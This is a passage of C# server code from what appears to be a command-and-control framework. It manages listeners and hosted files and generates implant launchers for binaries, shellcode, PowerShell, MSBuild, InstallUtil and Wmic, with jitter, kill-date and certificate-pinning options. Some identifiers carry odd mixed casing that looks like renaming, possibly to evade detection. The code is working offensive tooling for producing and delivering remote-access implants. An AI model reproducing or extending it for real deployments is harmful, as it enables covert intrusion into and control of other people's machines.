            HttpProfile profile = await this.GetHttpProfile(listener.ProfileId);
            matchingListener.ProfileId = profile.Id;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                DateTime eventTime = DateTime.UtcNow;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = eventTime,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name + " at: " + matchingListener.Urls,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.Status = ListenerStatus.Active;
                matchingListener = await this.StartInitialHttpListener(matchingListener);
            }

            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
            return await this.GetHttpListener(matchingListener.Id);
        }

        public async Task<BridgeListener> EditBridgeListener(BridgeListener listener)
        {
            BridgeListener matchingListener = await this.GetBridgeListener(listener.Id);
            matchingListener.Name = listener.Name;
            matchingListener.ANOTHERID = listener.ANOTHERID;
            matchingListener.BindAddress = listener.BindAddress;
            matchingListener.BindPort = listener.BindPort;
            matchingListener.ConnectAddresses = listener.ConnectAddresses;
            matchingListener.ConnectPort = listener.ConnectPort;

            BridgeProfile profile = await this.GetBridgeProfile(listener.ProfileId);
            matchingListener.ProfileId = profile.Id;

            if (matchingListener.Status == ListenerStatus.Active && listener.Status == ListenerStatus.Stopped)
            {
                matchingListener.Stop(_cancellationTokens[matchingListener.Id]);
                matchingListener.Status = listener.Status;
                matchingListener.StartTime = DateTime.MinValue;
                DateTime eventTime = DateTime.UtcNow;
                Event listenerEvent = await this.CreateEvent(new Event
                {
                    Time = eventTime,
                    MessageHeader = "Stopped Listener",
                    MessageBody = "Stopped Listener: " + matchingListener.Name + " at: " + matchingListener.ConnectAddresses,
                    Level = EventLevel.Warning,
                    Context = "*"
                });
                await _context.SaveChangesAsync();
            }
            else if (matchingListener.Status != ListenerStatus.Active && listener.Status == ListenerStatus.Active)
            {
                matchingListener.Status = ListenerStatus.Active;
                matchingListener = await this.StartInitialBridgeListener(matchingListener);
            }

            _context.Listeners.Update(matchingListener);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditListener(this, matchingListener);
            return await this.GetBridgeListener(matchingListener.Id);
        }
        #endregion

        #region HostedFile Actions
        public async Task<IEnumerable<HostedFile>> GetHostedFiles()
        {
            return await _context.HostedFiles.ToListAsync();
        }

        public async Task<HostedFile> GetHostedFile(int hostedFileId)
        {
            HostedFile file = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Id == hostedFileId);
            if (file == null)
            {
                throw new ControllerNotFoundException($"NotFound - HostedFile with id: {hostedFileId}");
            }
            return file;
        }

        public async Task<IEnumerable<HostedFile>> GetHostedFilesForListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            return await _context.HostedFiles.Where(HF => HF.ListenerId == listener.Id).ToListAsync();
        }

        public async Task<HostedFile> GetHostedFileForListener(int listenerId, int hostedFileId)
        {
            Listener listener = await this.GetListener(listenerId);
            HostedFile file = await this.GetHostedFile(hostedFileId);
            if (file.ListenerId != listener.Id)
            {
                throw new ControllerBadRequestException($"BadRequest - HostedFile with id: {hostedFileId} is not hosted on Listener with id: {listenerId}");
            }
            return file;
        }

        public async Task<HostedFile> CreateHostedFile(HostedFile file)
        {
            HttpListener listener = await this.GetHttpListener(file.ListenerId);
            if (file.ListenerId != listener.Id)
            {
                throw new ControllerBadRequestException($"BadRequest - HostedFile with listener id: {file.ListenerId} does not match listener with id: {listener.Id}");
            }
            HostedFile existing = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Path == file.Path && HF.ListenerId == file.ListenerId);
            if (existing != null)
            {
                // If file already exists and is being hosted, BadRequest
                throw new ControllerBadRequestException($"BadRequest - HostedFile already exists at path: {file.Path}");
            }
            try
            {
                HostedFile hostedFile = listener.HostFile(file);
                // Check if it already exists again, path could have changed
                existing = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Path == file.Path && HF.ListenerId == file.ListenerId);
                if (existing != null)
                {
                    throw new ControllerBadRequestException($"BadRequest - HostedFile already exists at: {hostedFile.Path}");
                }
                FileIndicator indicator = new FileIndicator
                {
                    FileName = hostedFile.Path.Split("/").Last(),
                    FilePath = listener.Urls + hostedFile.Path,
                    MD5 = Encrypt.Utilities.GetMD5(Convert.FromBase64String(hostedFile.Content)),
                    SHA1 = Encrypt.Utilities.GetSHA1(Convert.FromBase64String(hostedFile.Content)),
                    SHA2 = Encrypt.Utilities.GetSHA256(Convert.FromBase64String(hostedFile.Content))
                };
                await _context.Indicators.AddAsync(indicator);
                await _context.HostedFiles.AddAsync(hostedFile);
                await _context.SaveChangesAsync();
                // _notifier.OnCreateIndicator(this, indicator);
                // _notifier.OnCreateHostedFile(this, hostedFile);
                return await this.GetHostedFile(hostedFile.Id);
            }
            catch (Exception)
            {
                throw new ControllerBadRequestException($"BadRequest - Error hosting file at path: {file.Path}");
            }
        }

        public async Task<IEnumerable<HostedFile>> CreateHostedFiles(params HostedFile[] files)
        {
            await _context.HostedFiles.AddRangeAsync(files);
            await _context.SaveChangesAsync();
            return files;
        }

        public async Task<HostedFile> EditHostedFile(int listenerId, HostedFile file)
        {
            HttpListener listener = await this.GetHttpListener(listenerId);
            HostedFile matchingFile = await this.GetHostedFileForListener(listenerId, file.Id);
            matchingFile.Path = file.Path;
            matchingFile.Content = file.Content;
            try
            {
                HostedFile updatedFile = listener.HostFile(matchingFile);
                _context.HostedFiles.Update(updatedFile);
                await _context.SaveChangesAsync();
                // _notifier.OnEditHostedFile(this, updatedFile);
                return await this.GetHostedFile(updatedFile.Id);
            }
            catch
            {
                throw new ControllerBadRequestException($"BadRequest - Error hosting file at: {matchingFile.Path}");
            }
        }

        public async Task DeleteHostedFile(int listenerId, int hostedFileId)
        {
            HttpListener listener = await this.GetHttpListener(listenerId);
            HostedFile file = await this.GetHostedFileForListener(listenerId, hostedFileId);
            _context.HostedFiles.Remove(file);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteHostedFile(this, file.Id);
        }
        #endregion

        #region Launcher Actions
        public async Task<IEnumerable<Launcher>> GetLaunchers()
        {
            return await _context.Launchers.ToListAsync();
        }

        public async Task<Launcher> GetLauncher(int id)
        {
            Launcher launcher = await _context.Launchers.FirstOrDefaultAsync(L => L.Id == id);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - Launcher with id: {id}");
            }
            return launcher;
        }

        public async Task<BinaryLauncher> GetBinaryLauncher()
        {
            BinaryLauncher launcher = (BinaryLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Binary);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - BinaryLauncher");
            }
            return launcher;
        }

        public async Task<BinaryLauncher> GenerateBinaryLauncher()
        {
            BinaryLauncher launcher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);

            if (!template.CompatibleListenerTypes.Select(LT => LT.Id).Contains(listener.ListenerTypeId))
            {
                throw new ControllerBadRequestException($"BadRequest - ListenerType not compatible with chosen ImplantTemplate");
            }

            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetBinaryLauncher();
        }

        public async Task<BinaryLauncher> GenerateBinaryHostedLauncher(HostedFile file)
        {
            BinaryLauncher launcher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetBinaryLauncher();
        }

        public async Task<BinaryLauncher> EditBinaryLauncher(BinaryLauncher launcher)
        {
            BinaryLauncher matchingLauncher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetBinaryLauncher();
        }

        public async Task<ServiceBinaryLauncher> GetServiceBinaryLauncher()
        {
            ServiceBinaryLauncher launcher = (ServiceBinaryLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.ServiceBinary);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - ServiceBinaryLauncher");
            }
            return launcher;
        }


        public async Task<ServiceBinaryLauncher> GenerateServiceBinaryLauncher()
        {
            ServiceBinaryLauncher launcher = await this.GetServiceBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);

            if (!template.CompatibleListenerTypes.Select(LT => LT.Id).Contains(listener.ListenerTypeId))
            {
                throw new ControllerBadRequestException($"BadRequest - ListenerType not compatible with chosen ImplantTemplate");
            }

            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetServiceBinaryLauncher();
        }

        public async Task<ServiceBinaryLauncher> GenerateServiceBinaryHostedLauncher(HostedFile file)
        {
            ServiceBinaryLauncher launcher = await this.GetServiceBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetServiceBinaryLauncher();
        }

        public async Task<ServiceBinaryLauncher> EditServiceBinaryLauncher(ServiceBinaryLauncher launcher)
        {
            ServiceBinaryLauncher matchingLauncher = await this.GetServiceBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetServiceBinaryLauncher();
        }


        public async Task<ShellCodeLauncher> GetShellCodeLauncher()
        {
            ShellCodeLauncher launcher = (ShellCodeLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.ShellCode);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - ShellCodeLauncher");
            }
            return launcher;
        }

        public async Task<ShellCodeLauncher> GenerateShellCodeLauncher()
        {
            ShellCodeLauncher launcher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);

            if (!template.CompatibleListenerTypes.Select(LT => LT.Id).Contains(listener.ListenerTypeId))
            {
                throw new ControllerBadRequestException($"BadRequest - ListenerType not compatible with chosen ImplantTemplate");
            }

            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<ShellCodeLauncher> GenerateShellCodeHostedLauncher(HostedFile file)
        {
            ShellCodeLauncher launcher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<ShellCodeLauncher> EditShellCodeLauncher(ShellCodeLauncher launcher)
        {
            ShellCodeLauncher matchingLauncher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<PowerShellLauncher> GetPowerShellLauncher()
        {
            PowerShellLauncher launcher = (PowerShellLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.PowerShell);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - PowerShellLauncher");
            }
            return launcher;
        }

        public async Task<PowerShellLauncher> GeneratePowerShellLauncher()
        {
            PowerShellLauncher launcher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<PowerShellLauncher> GeneratePowerShellHostedLauncher(HostedFile file)
        {
            PowerShellLauncher launcher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<PowerShellLauncher> EditPowerShellLauncher(PowerShellLauncher launcher)
        {
            PowerShellLauncher matchingLauncher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.PowerShellCode = launcher.PowerShellCode;
            matchingLauncher.EncodedLauncherString = launcher.EncodedLauncherString;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<MSBuildLauncher> GetMSBuildLauncher()
        {
            MSBuildLauncher launcher = (MSBuildLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.MSBuild);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - MSBuildLauncher");
            }
            return launcher;
        }

        public async Task<MSBuildLauncher> GenerateMSBuildLauncher()
        {
            MSBuildLauncher launcher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<MSBuildLauncher> GenerateMSBuildHostedLauncher(HostedFile file)
        {
            MSBuildLauncher launcher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<MSBuildLauncher> EditMSBuildLauncher(MSBuildLauncher launcher)
        {
            MSBuildLauncher matchingLauncher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.TargetName = launcher.TargetName;
            matchingLauncher.TaskName = launcher.TaskName;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<InstallUtilLauncher> GetInstallUtilLauncher()
        {
            InstallUtilLauncher launcher = (InstallUtilLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.InstallUtil);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - InstallUtilLauncher");
            }
            return launcher;
        }

        public async Task<InstallUtilLauncher> GenerateInstallUtilLauncher()
        {
            InstallUtilLauncher launcher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<InstallUtilLauncher> GenerateInstallUtilHostedLauncher(HostedFile file)
        {
            InstallUtilLauncher launcher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<InstallUtilLauncher> EditInstallUtilLauncher(InstallUtilLauncher launcher)
        {
            InstallUtilLauncher matchingLauncher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<WmicLauncher> GetWmicLauncher()
        {
            WmicLauncher launcher = (WmicLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Wmic);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - WmicLauncher");
            }
            return launcher;
        }

        public async Task<WmicLauncher> GenerateWmicLauncher()
        {
            WmicLauncher launcher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grawl grawl = new Grawl
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValCerT = launcher.ValCerT,
                UsCertPin = launcher.UsCertPin,
                Delay = launcher.Delay,
                JItterPercent = launcher.JItterPercent,
                ConneCTAttEmpts = launcher.ConneCTAttEmpts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);

            launcher.GetLauncher(
                this.GrawlTemplateReplace(template.StagerCode, template, grawl, listener, profile),
                CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher),
                grawl,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWmicLauncher();
        }

        public async Task<WmicLauncher> GenerateWmicHostedLauncher(HostedFile file)
        {
            WmicLauncher launcher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWmicLauncher();
        }

        public async Task<WmicLauncher> EditWmicLauncher(WmicLauncher launcher)
        {
            WmicLauncher matchingLauncher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValCerT = launcher.ValCerT;
            matchingLauncher.UsCertPin = launcher.UsCertPin;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JItterPercent = launcher.JItterPercent;
            matchingLauncher.ConneCTAttEmpts = launcher.ConneCTAttEmpts;
